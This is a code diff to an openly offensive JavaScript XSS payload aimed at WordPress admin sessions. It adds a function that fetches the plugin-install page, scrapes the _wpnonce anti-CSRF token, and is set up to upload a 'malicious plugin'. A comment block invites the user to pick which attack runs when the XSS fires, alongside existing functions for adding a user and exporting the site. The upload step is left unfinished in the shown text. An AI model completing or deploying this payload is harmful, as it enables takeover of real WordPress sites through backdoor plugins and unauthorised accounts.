@@ -150,8 +150,50 @@ function exportWordPressSite()
 
 
 
+// Get the nonce required for adding a new plugin
+// and upload the malicious plugin
+function getNonceAndAddPlugin()
+{
+	console.log("Starting add plugin, hunting for the nonce...");
+
+		// console.log("Starting getNonce...");
+	var uri = "/wp-admin/plugin-install.php";
+
+	xhr = new XMLHttpRequest();
+
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+
+
+	xhr.onreadystatechange = function()
+	{
+		if (xhr.readyState == XMLHttpRequest.DONE)
+		{
+			var response = read_body(xhr);
+			var noncePos = response.indexOf('name="_wpnonce" value="');
+			console.log("Nonce position: " + noncePos);
+
+			var nonceVal = response.substring(noncePos+23, noncePos+33);
+			console.log("Nonce substring: " + nonceVal);
+
+			// Now we have the nonce, we need to add the plugin....
+		}
+	}
+}
+
+
+
+
+/*
+	Calling functions
+
+	Pick what you want to run when the XSS is executed by uncommenting
+	Some functions require tweaking of variables to achice the desired 
+	outcome. 
+*/
 
 // Uncomment the function you want to run on the XSS pop
 //getNonceAndAddUser();
 //exportWordPressSite();
+//getNonceAndAddPlugin();
 
